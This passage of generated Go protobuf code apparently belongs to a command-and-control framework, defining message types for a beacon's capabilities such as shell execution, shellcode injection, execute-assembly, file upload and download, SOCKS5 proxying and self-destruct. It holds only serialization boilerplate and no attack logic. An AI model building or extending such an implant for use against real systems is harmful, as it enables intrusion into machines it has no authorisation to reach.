func (*CapPpid) Descriptor() ([]byte, []int) {
	return file_common_v1_common_proto_rawDescGZIP(), []int{23}
}

func (x *CapPpid) GetPpid() int64 {
	if x != nil {
		return x.Ppid
	}
	return 0
}

// CapExit завершение процесса бикона
type CapExit struct {
	state         protoimpl.MessageState `protogen:"open.v1"`
	unknownFields protoimpl.UnknownFields
	sizeCache     protoimpl.SizeCache
}

func (x *CapExit) Reset() {
	*x = CapExit{}
	mi := &file_common_v1_common_proto_msgTypes[24]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *CapExit) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*CapExit) ProtoMessage() {}

func (x *CapExit) ProtoReflect() protoreflect.Message {
	mi := &file_common_v1_common_proto_msgTypes[24]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use CapExit.ProtoReflect.Descriptor instead.
func (*CapExit) Descriptor() ([]byte, []int) {
	return file_common_v1_common_proto_rawDescGZIP(), []int{24}
}

// CapSocks5 передача данных для обработки как socks5
type CapSocks5 struct {
	state         protoimpl.MessageState `protogen:"open.v1"`
	unknownFields protoimpl.UnknownFields
	sizeCache     protoimpl.SizeCache
}

func (x *CapSocks5) Reset() {
	*x = CapSocks5{}
	mi := &file_common_v1_common_proto_msgTypes[25]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *CapSocks5) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*CapSocks5) ProtoMessage() {}

func (x *CapSocks5) ProtoReflect() protoreflect.Message {
	mi := &file_common_v1_common_proto_msgTypes[25]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use CapSocks5.ProtoReflect.Descriptor instead.
func (*CapSocks5) Descriptor() ([]byte, []int) {
	return file_common_v1_common_proto_rawDescGZIP(), []int{25}
}

var File_common_v1_common_proto protoreflect.FileDescriptor

var file_common_v1_common_proto_rawDesc = []byte{
	0x0a, 0x16, 0x63, 0x6f, 0x6d, 0x6d, 0x6f, 0x6e, 0x2f, 0x76, 0x31, 0x2f, 0x63, 0x6f, 0x6d, 0x6d,
	0x6f, 0x6e, 0x2e, 0x70, 0x72, 0x6f, 0x74, 0x6f, 0x12, 0x09, 0x63, 0x6f, 0x6d, 0x6d, 0x6f, 0x6e,
	0x2e, 0x76, 0x31, 0x22, 0x38, 0x0a, 0x08, 0x43, 0x61, 0x70, 0x53, 0x6c, 0x65, 0x65, 0x70, 0x12,
	0x14, 0x0a, 0x05, 0x73, 0x6c, 0x65, 0x65, 0x70, 0x18, 0x01, 0x20, 0x01, 0x28, 0x0d, 0x52, 0x05,
	0x73, 0x6c, 0x65, 0x65, 0x70, 0x12, 0x16, 0x0a, 0x06, 0x6a, 0x69, 0x74, 0x74, 0x65, 0x72, 0x18,
	0x02, 0x20, 0x01, 0x28, 0x0d, 0x52, 0x06, 0x6a, 0x69, 0x74, 0x74, 0x65, 0x72, 0x22, 0x1b, 0x0a,
	0x05, 0x43, 0x61, 0x70, 0x4c, 0x73, 0x12, 0x12, 0x0a, 0x04, 0x70, 0x61, 0x74, 0x68, 0x18, 0x01,
	0x20, 0x01, 0x28, 0x09, 0x52, 0x04, 0x70, 0x61, 0x74, 0x68, 0x22, 0x08, 0x0a, 0x06, 0x43, 0x61,
	0x70, 0x50, 0x77, 0x64, 0x22, 0x1b, 0x0a, 0x05, 0x43, 0x61, 0x70, 0x43, 0x64, 0x12, 0x12, 0x0a,
	0x04, 0x70, 0x61, 0x74, 0x68, 0x18, 0x01, 0x20, 0x01, 0x28, 0x09, 0x52, 0x04, 0x70, 0x61, 0x74,
	0x68, 0x22, 0x0b, 0x0a, 0x09, 0x43, 0x61, 0x70, 0x57, 0x68, 0x6f, 0x61, 0x6d, 0x69, 0x22, 0x07,
	0x0a, 0x05, 0x43, 0x61, 0x70, 0x50, 0x73, 0x22, 0x1c, 0x0a, 0x06, 0x43, 0x61, 0x70, 0x43, 0x61,
	0x74, 0x12, 0x12, 0x0a, 0x04, 0x70, 0x61, 0x74, 0x68, 0x18, 0x01, 0x20, 0x01, 0x28, 0x09, 0x52,
	0x04, 0x70, 0x61, 0x74, 0x68, 0x22, 0x2f, 0x0a, 0x07, 0x43, 0x61, 0x70, 0x45, 0x78, 0x65, 0x63,
	0x12, 0x10, 0x0a, 0x03, 0x63, 0x6d, 0x64, 0x18, 0x01, 0x20, 0x01, 0x28, 0x09, 0x52, 0x03, 0x63,
	0x6d, 0x64, 0x12, 0x12, 0x0a, 0x04, 0x61, 0x72, 0x67, 0x73, 0x18, 0x02, 0x20, 0x01, 0x28, 0x09,
	0x52, 0x04, 0x61, 0x72, 0x67, 0x73, 0x22, 0x2b, 0x0a, 0x05, 0x43, 0x61, 0x70, 0x43, 0x70, 0x12,
	0x10, 0x0a, 0x03, 0x73, 0x72, 0x63, 0x18, 0x01, 0x20, 0x01, 0x28, 0x09, 0x52, 0x03, 0x73, 0x72,
	0x63, 0x12, 0x10, 0x0a, 0x03, 0x64, 0x73, 0x74, 0x18, 0x02, 0x20, 0x01, 0x28, 0x09, 0x52, 0x03,
	0x64, 0x73, 0x74, 0x22, 0x09, 0x0a, 0x07, 0x43, 0x61, 0x70, 0x4a, 0x6f, 0x62, 0x73, 0x22, 0x1c,
	0x0a, 0x0a, 0x43, 0x61, 0x70, 0x4a, 0x6f, 0x62, 0x6b, 0x69, 0x6c, 0x6c, 0x12, 0x0e, 0x0a, 0x02,
	0x69, 0x64, 0x18, 0x01, 0x20, 0x01, 0x28, 0x03, 0x52, 0x02, 0x69, 0x64, 0x22, 0x1b, 0x0a, 0x07,
	0x43, 0x61, 0x70, 0x4b, 0x69, 0x6c, 0x6c, 0x12, 0x10, 0x0a, 0x03, 0x70, 0x69, 0x64, 0x18, 0x01,
	0x20, 0x01, 0x28, 0x04, 0x52, 0x03, 0x70, 0x69, 0x64, 0x22, 0x2b, 0x0a, 0x05, 0x43, 0x61, 0x70,
	0x4d, 0x76, 0x12, 0x10, 0x0a, 0x03, 0x73, 0x72, 0x63, 0x18, 0x01, 0x20, 0x01, 0x28, 0x09, 0x52,
	0x03, 0x73, 0x72, 0x63, 0x12, 0x10, 0x0a, 0x03, 0x64, 0x73, 0x74, 0x18, 0x02, 0x20, 0x01, 0x28,
	0x09, 0x52, 0x03, 0x64, 0x73, 0x74, 0x22, 0x1e, 0x0a, 0x08, 0x43, 0x61, 0x70, 0x4d, 0x6b, 0x64,
	0x69, 0x72, 0x12, 0x12, 0x0a, 0x04, 0x70, 0x61, 0x74, 0x68, 0x18, 0x01, 0x20, 0x01, 0x28, 0x09,
	0x52, 0x04, 0x70, 0x61, 0x74, 0x68, 0x22, 0x1b, 0x0a, 0x05, 0x43, 0x61, 0x70, 0x52, 0x6d, 0x12,
	0x12, 0x0a, 0x04, 0x70, 0x61, 0x74, 0x68, 0x18, 0x01, 0x20, 0x01, 0x28, 0x09, 0x52, 0x04, 0x70,
	0x61, 0x74, 0x68, 0x22, 0x39, 0x0a, 0x0f, 0x43, 0x61, 0x70, 0x45, 0x78, 0x65, 0x63, 0x41, 0x73,
	0x73, 0x65, 0x6d, 0x62, 0x6c, 0x79, 0x12, 0x12, 0x0a, 0x04, 0x61, 0x72, 0x67, 0x73, 0x18, 0x01,
	0x20, 0x01, 0x28, 0x09, 0x52, 0x04, 0x61, 0x72, 0x67, 0x73, 0x12, 0x12, 0x0a, 0x04, 0x62, 0x6c,
	0x6f, 0x62, 0x18, 0x02, 0x20, 0x01, 0x28, 0x0c, 0x52, 0x04, 0x62, 0x6c, 0x6f, 0x62, 0x22, 0x3d,
	0x0a, 0x15, 0x43, 0x61, 0x70, 0x53, 0x68, 0x65, 0x6c, 0x6c, 0x63, 0x6f, 0x64, 0x65, 0x49, 0x6e,
	0x6a, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x12, 0x10, 0x0a, 0x03, 0x70, 0x69, 0x64, 0x18, 0x01,
	0x20, 0x01, 0x28, 0x03, 0x52, 0x03, 0x70, 0x69, 0x64, 0x12, 0x12, 0x0a, 0x04, 0x62, 0x6c, 0x6f,
	0x62, 0x18, 0x02, 0x20, 0x01, 0x28, 0x0c, 0x52, 0x04, 0x62, 0x6c, 0x6f, 0x62, 0x22, 0x21, 0x0a,
	0x0b, 0x43, 0x61, 0x70, 0x44, 0x6f, 0x77, 0x6e, 0x6c, 0x6f, 0x61, 0x64, 0x12, 0x12, 0x0a, 0x04,
	0x70, 0x61, 0x74, 0x68, 0x18, 0x01, 0x20, 0x01, 0x28, 0x09, 0x52, 0x04, 0x70, 0x61, 0x74, 0x68,
	0x22, 0x33, 0x0a, 0x09, 0x43, 0x61, 0x70, 0x55, 0x70, 0x6c, 0x6f, 0x61, 0x64, 0x12, 0x12, 0x0a,
	0x04, 0x70, 0x61, 0x74, 0x68, 0x18, 0x01, 0x20, 0x01, 0x28, 0x09, 0x52, 0x04, 0x70, 0x61, 0x74,
	0x68, 0x12, 0x12, 0x0a, 0x04, 0x62, 0x6c, 0x6f, 0x62, 0x18, 0x02, 0x20, 0x01, 0x28, 0x0c, 0x52,
	0x04, 0x62, 0x6c, 0x6f, 0x62, 0x22, 0x20, 0x0a, 0x08, 0x43, 0x61, 0x70, 0x50, 0x61, 0x75, 0x73,
	0x65, 0x12, 0x14, 0x0a, 0x05, 0x70, 0x61, 0x75, 0x73, 0x65, 0x18, 0x01, 0x20, 0x01, 0x28, 0x0d,
	0x52, 0x05, 0x70, 0x61, 0x75, 0x73, 0x65, 0x22, 0x0d, 0x0a, 0x0b, 0x43, 0x61, 0x70, 0x44, 0x65,
	0x73, 0x74, 0x72, 0x75, 0x63, 0x74, 0x22, 0x35, 0x0a, 0x0d, 0x43, 0x61, 0x70, 0x45, 0x78, 0x65,
	0x63, 0x44, 0x65, 0x74, 0x61, 0x63, 0x68, 0x12, 0x10, 0x0a, 0x03, 0x63, 0x6d, 0x64, 0x18, 0x01,
	0x20, 0x01, 0x28, 0x09, 0x52, 0x03, 0x63, 0x6d, 0x64, 0x12, 0x12, 0x0a, 0x04, 0x61, 0x72, 0x67,
	0x73, 0x18, 0x02, 0x20, 0x01, 0x28, 0x09, 0x52, 0x04, 0x61, 0x72, 0x67, 0x73, 0x22, 0x1c, 0x0a,
	0x08, 0x43, 0x61, 0x70, 0x53, 0x68, 0x65, 0x6c, 0x6c, 0x12, 0x10, 0x0a, 0x03, 0x63, 0x6d, 0x64,
	0x18, 0x01, 0x20, 0x01, 0x28, 0x09, 0x52, 0x03, 0x63, 0x6d, 0x64, 0x22, 0x1d, 0x0a, 0x07, 0x43,
	0x61, 0x70, 0x50, 0x70, 0x69, 0x64, 0x12, 0x12, 0x0a, 0x04, 0x70, 0x70, 0x69, 0x64, 0x18, 0x01,
	0x20, 0x01, 0x28, 0x03, 0x52, 0x04, 0x70, 0x70, 0x69, 0x64, 0x22, 0x09, 0x0a, 0x07, 0x43, 0x61,
	0x70, 0x45, 0x78, 0x69, 0x74, 0x22, 0x0b, 0x0a, 0x09, 0x43, 0x61, 0x70, 0x53, 0x6f, 0x63, 0x6b,
	0x73, 0x35, 0x42, 0x38, 0x5a, 0x36, 0x67, 0x69, 0x74, 0x68, 0x75, 0x62, 0x2e, 0x63, 0x6f, 0x6d,
	0x2f, 0x63, 0x32, 0x6d, 0x69, 0x63, 0x72, 0x6f, 0x2f, 0x63, 0x32, 0x6d, 0x73, 0x68, 0x72, 0x2f,
	0x70, 0x72, 0x6f, 0x74, 0x6f, 0x2f, 0x67, 0x65, 0x6e, 0x2f, 0x63, 0x6f, 0x6d, 0x6d, 0x6f, 0x6e,
	0x2f, 0x76, 0x31, 0x3b, 0x63, 0x6f, 0x6d, 0x6d, 0x6f, 0x6e, 0x76, 0x31, 0x62, 0x06, 0x70, 0x72,
	0x6f, 0x74, 0x6f, 0x33,
}

var (
	file_common_v1_common_proto_rawDescOnce sync.Once
	file_common_v1_common_proto_rawDescData = file_common_v1_common_proto_rawDesc
)

func file_common_v1_common_proto_rawDescGZIP() []byte {
	file_common_v1_common_proto_rawDescOnce.Do(func() {
		file_common_v1_common_proto_rawDescData = protoimpl.X.CompressGZIP(file_common_v1_common_proto_rawDescData)
	})
	return file_common_v1_common_proto_rawDescData
}

var file_common_v1_common_proto_msgTypes = make([]protoimpl.MessageInfo, 26)
var file_common_v1_common_proto_goTypes = []any{
	(*CapSleep)(nil),              // 0: common.v1.CapSleep
	(*CapLs)(nil),                 // 1: common.v1.CapLs
	(*CapPwd)(nil),                // 2: common.v1.CapPwd
	(*CapCd)(nil),                 // 3: common.v1.CapCd
	(*CapWhoami)(nil),             // 4: common.v1.CapWhoami
	(*CapPs)(nil),                 // 5: common.v1.CapPs
	(*CapCat)(nil),                // 6: common.v1.CapCat
	(*CapExec)(nil),               // 7: common.v1.CapExec
	(*CapCp)(nil),                 // 8: common.v1.CapCp
	(*CapJobs)(nil),               // 9: common.v1.CapJobs
	(*CapJobkill)(nil),            // 10: common.v1.CapJobkill
	(*CapKill)(nil),               // 11: common.v1.CapKill
	(*CapMv)(nil),                 // 12: common.v1.CapMv
	(*CapMkdir)(nil),              // 13: common.v1.CapMkdir
	(*CapRm)(nil),                 // 14: common.v1.CapRm
	(*CapExecAssembly)(nil),       // 15: common.v1.CapExecAssembly
	(*CapShellcodeInjection)(nil), // 16: common.v1.CapShellcodeInjection
	(*CapDownload)(nil),           // 17: common.v1.CapDownload
	(*CapUpload)(nil),             // 18: common.v1.CapUpload
	(*CapPause)(nil),              // 19: common.v1.CapPause
	(*CapDestruct)(nil),           // 20: common.v1.CapDestruct
	(*CapExecDetach)(nil),         // 21: common.v1.CapExecDetach
	(*CapShell)(nil),              // 22: common.v1.CapShell
	(*CapPpid)(nil),               // 23: common.v1.CapPpid
	(*CapExit)(nil),               // 24: common.v1.CapExit
	(*CapSocks5)(nil),             // 25: common.v1.CapSocks5
}
var file_common_v1_common_proto_depIdxs = []int32{
	0, // [0:0] is the sub-list for method output_type
	0, // [0:0] is the sub-list for method input_type
	0, // [0:0] is the sub-list for extension type_name
	0, // [0:0] is the sub-list for extension extendee
	0, // [0:0] is the sub-list for field type_name
}

func init() { file_common_v1_common_proto_init() }
func file_common_v1_common_proto_init() {
	if File_common_v1_common_proto != nil {
		return
	}
	type x struct{}
	out := protoimpl.TypeBuilder{
		File: protoimpl.DescBuilder{
			GoPackagePath: reflect.TypeOf(x{}).PkgPath(),
			RawDescriptor: file_common_v1_common_proto_rawDesc,
			NumEnums:      0,
			NumMessages:   26,
			NumExtensions: 0,
			NumServices:   0,
		},
		GoTypes:           file_common_v1_common_proto_goTypes,
		DependencyIndexes: file_common_v1_common_proto_depIdxs,
		MessageInfos:      file_common_v1_common_proto_msgTypes,
	}.Build()
	File_common_v1_common_proto = out.File
	file_common_v1_common_proto_rawDesc = nil
	file_common_v1_common_proto_goTypes = nil
	file_common_v1_common_proto_depIdxs = nil
}
